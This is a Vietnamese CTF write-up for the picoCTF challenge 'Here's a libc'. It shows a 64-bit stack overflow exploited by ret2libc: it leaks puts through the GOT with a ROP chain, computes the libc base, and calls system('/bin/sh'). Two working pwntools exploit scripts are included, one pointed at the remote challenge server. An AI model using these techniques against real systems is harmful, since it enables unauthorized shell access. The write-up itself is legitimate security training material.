# Here's a libc 

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ls
Makefile  libc.so.6  vuln
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./vuln
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```
Oke sau khi load file về, ta có 3 file như trên. Ta run binary thì không được. Là do binary này liên kết với file thư viện có version khác với version trên máy ta hiện tại.

Để sure về điều đó thì mình cùng đi check thử xem:

### Binary file

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ldd vuln
        linux-vdso.so.1 (0x00007ffed6b25000)
        libc.so.6 => ./libc.so.6 (0x00007f8825000000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f88253f5000)
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ strings libc.so.6| grep "release version"
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```
file vuln link với libc version ***2.27***

### My machine

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ strings /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "release version"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
```
Như đã thấy thì 2 version khá chênh nên ta cần đến [pwninit](https://github.com/io12/pwninit)

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ pwninit
bin: ./vuln
libc: ./libc.so.6

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb
unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb
warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2)
copying ./vuln to ./vuln_patched
running patchelf on ./vuln_patched
writing solve.py stub
```

Then,

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./vuln
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ls
Makefile  ld-2.27.so  libc.so.6  solve.py  vuln  vuln_patched

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./ld-2.27.so ./vuln
WeLcOmE To mY EcHo sErVeR!
abc
AbC
```
Tuy nhiên như này thì trông nó khá là cồng kềnh, do đó:

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ patchelf --set-interpreter ./ld-2.27.so ./vuln

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./vuln
WeLcOmE To mY EcHo sErVeR!
abc
AbC
```

Oke giờ thì bắt tay vào làm.

### File
```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped
```

### Checksec

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ checksec vuln
[*] '/mnt/d/pwn_myself/Pico/Here_libc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```
### Main func

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  v7 = argc;
  v6 = argv;
  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  v11 = 27LL;
  strcpy(v8, "Welcome to my echo server!");
  v10 = 26LL;
  v3 = alloca(32LL);
  s = (char *)&v6;
  for ( i = 0LL; i < v11; ++i )
  {
    v4 = convert_case((unsigned int)v8[i], i);
    s[i] = v4;
  }
  v5 = s;
  puts(s);
  while ( 1 )
    do_stuff(v5);
}
```

### convert_case func

```c
__int64 __fastcall convert_case(unsigned __int8 a1, char a2)
{
  __int64 result; // rax
  if ( (char)a1 <= 96 || (char)a1 > 122 )
  {
    if ( (char)a1 <= 64 || (char)a1 > 90 )
    {   result = a1;    }
    else if ( (a2 & 1) != 0 )
    {   result = (unsigned int)a1 + 32; }
    else
    {  result = a1; }
  }
  else if ( (a2 & 1) != 0 )
  { result = a1;    }
  else
  { result = (unsigned int)a1 - 32; }
  return result;
}
```
### do_stuff func
```c
int do_stuff()
{
  char v0; // al
  char v2; // [rsp+Fh] [rbp-81h] BYREF
  char s[112]; // [rsp+10h] [rbp-80h] BYREF
  __int64 v4; // [rsp+80h] [rbp-10h]
  unsigned __int64 i; // [rsp+88h] [rbp-8h]

  v4 = 0LL;
  __isoc99_scanf("%[^\n]", s);
  __isoc99_scanf("%c", &v2);
  for ( i = 0LL; i <= 0x63; ++i )
  {
    v0 = convert_case(s[i], i);
    s[i] = v0;
  }
  return puts(s);
}
```

Lúc mới start chương trình thì gọi hàm convert_case với chuỗi đã chỉ định, và đây là output

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ ./vuln
WeLcOmE To mY EcHo sErVeR!
```
Đọc sơ code thì có vẻ chức năng hàm convert_case cũng đơn giản chỉ là in hoa xen kẽ

Sau khi xuất ra như thế thì flow chương trình vào vòng lặp với **do_stuff** 

Có 2 *scanf* đáng nói ở đây, ***"%\[^\n\]"*** chuỗi này cho phép mọi kí tự ngoại trừ *\n*, trong khi ***%c*** thì chỉ nhận 1 kí tự, có vẻ như sau khi nhập 1 chuỗi rồi nhấn enter thì *\n* là đầu vào của scanf thứ 2.

Trong binary này không có công cụ cho việc lấy shell hay in flag, Nx lại enable ta sẽ suy nghĩ đến cái tên chall => ret2libc :))

Oke giờ thì tính byte overflow đến return address nào.

```python
pwndbg> disass do_stuff
Dump of assembler code for function do_stuff:
   0x00000000004006d8 <+0>:     push   rbp
   0x00000000004006d9 <+1>:     mov    rbp,rsp
   0x00000000004006dc <+4>:     sub    rsp,0x90
   0x00000000004006e3 <+11>:    mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004006eb <+19>:    lea    rax,[rbp-0x80]
   0x00000000004006ef <+23>:    mov    rsi,rax
   0x00000000004006f2 <+26>:    lea    rdi,[rip+0x23b]        # 0x400934
   0x00000000004006f9 <+33>:    mov    eax,0x0
   0x00000000004006fe <+38>:    call   0x400580 <__isoc99_scanf@plt>
   0x0000000000400703 <+43>:    lea    rax,[rbp-0x81]
   0x000000000040070a <+50>:    mov    rsi,rax
   0x000000000040070d <+53>:    lea    rdi,[rip+0x226]        # 0x40093a
   0x0000000000400714 <+60>:    mov    eax,0x0
   0x0000000000400719 <+65>:    call   0x400580 <__isoc99_scanf@plt>
   0x000000000040071e <+70>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000400726 <+78>:    jmp    0x40075b <do_stuff+131>
   0x0000000000400728 <+80>:    lea    rdx,[rbp-0x80]
   0x000000000040072c <+84>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400730 <+88>:    add    rax,rdx
   0x0000000000400733 <+91>:    movzx  eax,BYTE PTR [rax]
   0x0000000000400736 <+94>:    movsx  eax,al
   0x0000000000400739 <+97>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040073d <+101>:   mov    rsi,rdx
   0x0000000000400740 <+104>:   mov    edi,eax
   0x0000000000400742 <+106>:   call   0x400677 <convert_case>
   0x0000000000400747 <+111>:   mov    ecx,eax
   0x0000000000400749 <+113>:   lea    rdx,[rbp-0x80]
   0x000000000040074d <+117>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400751 <+121>:   add    rax,rdx
   0x0000000000400754 <+124>:   mov    BYTE PTR [rax],cl
   0x0000000000400756 <+126>:   add    QWORD PTR [rbp-0x8],0x1
   0x000000000040075b <+131>:   cmp    QWORD PTR [rbp-0x8],0x63
   0x0000000000400760 <+136>:   jbe    0x400728 <do_stuff+80>
   0x0000000000400762 <+138>:   lea    rax,[rbp-0x80]
   0x0000000000400766 <+142>:   mov    rdi,rax
   0x0000000000400769 <+145>:   call   0x400540 <puts@plt>
   0x000000000040076e <+150>:   nop
   0x000000000040076f <+151>:   leave
   0x0000000000400770 <+152>:   ret
End of assembler dump.
pwndbg> b* 0x00000000004006fe
Breakpoint 1 at 0x4006fe
pwndbg> b* 0x0000000000400770
Breakpoint 2 at 0x400770

```

```java
 ► 0x4006fe <do_stuff+38>    call   __isoc99_scanf@plt                      <__isoc99_scanf@plt>
        format: 0x400934 ◂— 0x6325005d0a5e5b25 /* '%[^\n]' */
        vararg: 0x7fffffffdfb0 —▸ 0x7fffffffe040 ◂— 'WeLcOmE To mY EcHo sErVeR!'

```
```js
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x400770 <do_stuff+152>         ret                                  <0x4008a0; main+303>
    ↓
   0x4008a0 <main+303>             jmp    main+293                      <main+293>
    ↓
   0x400896 <main+293>             mov    eax, 0
   0x40089b <main+298>             call   do_stuff                      <do_stuff>

   0x4008a0 <main+303>             jmp    main+293                      <main+293>

   0x4008a2                        nop    word ptr cs:[rax + rax]
   0x4008ac                        nop    dword ptr [rax]
   0x4008b0 <__libc_csu_init>      push   r15
   0x4008b2 <__libc_csu_init+2>    push   r14
   0x4008b4 <__libc_csu_init+4>    mov    r15, rdx
   0x4008b7 <__libc_csu_init+7>    push   r13
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe038 —▸ 0x4008a0 (main+303) ◂— jmp 0x400896
01:0008│     0x7fffffffe040 ◂— 'WeLcOmE To mY EcHo sErVeR!'
```

```python
>>> str = 0x7fffffffdfb0
>>> ret = 0x7fffffffe038
>>> ret - str
136
```
=> overflow 136 bytes

Cơ mà cần nơi để return về. Nói là ret2libc thì cần leak được địa chỉ trong binary để tính ra libc base.

Do đó ta lợi dùng hàm **puts**

đưa vào đó puts_got để puts in ra địa chỉ thật trên binary *chỗ này mình cũng chưa hiểu tại sao :(( chắc như là 1+1=2*

> #### Ta có thể sử dụng got_other_funcs, như là **setresgid** chẳng hạn

Do đó ta cần gadget **pop rdi ; ret** và **ret**

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ ROPgadget --binary vuln | grep "pop rdi ; ret"
0x0000000000400913 : pop rdi ; ret
------------------------------------------------
0x000000000040052e : ret
```
Sau khi đã có được địa chỉ thực của puts => tìm các offset trên libc cần thiết:

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ readelf -sW /mnt/d/pwn_myself/Pico/Here_libc/libc.so.6 | grep "puts"
   191: 0000000000080a30   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   496: 0000000000126870  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   678: 0000000000128780   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1141: 000000000007f260   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
  1677: 000000000007f260   396 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
  2310: 000000000008a6b0   143 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ readelf -sW /mnt/d/pwn_myself/Pico/Here_libc/libc.so.6 | grep "system"
   232: 000000000015a020    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   607: 000000000004f4e0    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ strings -tx /mnt/d/pwn_myself/Pico/Here_libc/libc.so.6 | grep "/b
in/sh"
 1b40fa /bin/sh
```

Đây chỉ mới là offset, do đó cần tính địa chỉ thực dựa vào libc base

> system_address = libc_base + system_offset
>
> binsh_address = libc_base + binsh_offset

Sau khi gọi hàm puts thì cũng đừng quên ret về hàm khác **(do_stuff)** để tránh lỗi, chứ không puts xong thì nó biết làm gì nựa giờ.

Sau khi có địa chỉ đầy đủ thì payload cuối cùng so ez

## Exploit local basic

```python
from pwn import *

binary  = context.binary = ELF('./vuln')
r = process(binary.path)
#gdb.attach(r, api=True)

ret = 0x000000000040052e
pop_rdi_ret = 0x0000000000400913
do_stuff = 0x4006d8
plt_puts = 0x400540
got_puts = 0x601018

junk = b"a" * 136
payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) 
payload += p64(ret) + p64(do_stuff)

r.sendline(payload)

leak = r.recvline()
leak = r.recvline()

leak = u64(r.recvline().strip().ljust(8,b"\x00"))
log.info('puts: ' + hex(leak))

offset_puts = 0x0000000000080a30
libc_base = leak - offset_puts
print('libc base = ' + hex(libc_base))

system_offset = 0x000000000004f4e0
binsh_offset = 0x1b40fa

system_address = libc_base + system_offset
binsh_address = libc_base + binsh_offset

payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_address) +p64(system_address)
r.sendline(payload)

r.interactive()

```

## Exploit remote and local vippro123

```python
from pwn import *

libc = ELF('libc.so.6')
binary = ELF('./vuln')

if not args.REMOTE:
    r = process(binary.path)
else:
    r = remote('mercury.picoctf.net', 1774)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
puts_offset = libc.symbols['puts']


r.recvuntil("sErVeR!\n")

payload1 = b'a' * 136
payload1 += p64(ret)
payload1 += p64(pop_rdi_ret)
payload1 += p64(binary.got['puts'])
payload1 += p64(binary.plt['puts'])
payload1 += p64(ret)
payload1 += p64(binary.symbols['do_stuff'])

r.sendline(payload1)
r.recvline()

leak_puts = r.recv(6) + b'\x00\x00'
print("Leaked puts: " + str(hex(u64(leak_puts))))

libc.address = u64(leak_puts) - puts_offset
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']


payload2 = b'a'*136
payload2 += p64(ret)
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh)
payload2 += p64(system)

r.sendline(payload2)
r.interactive()
```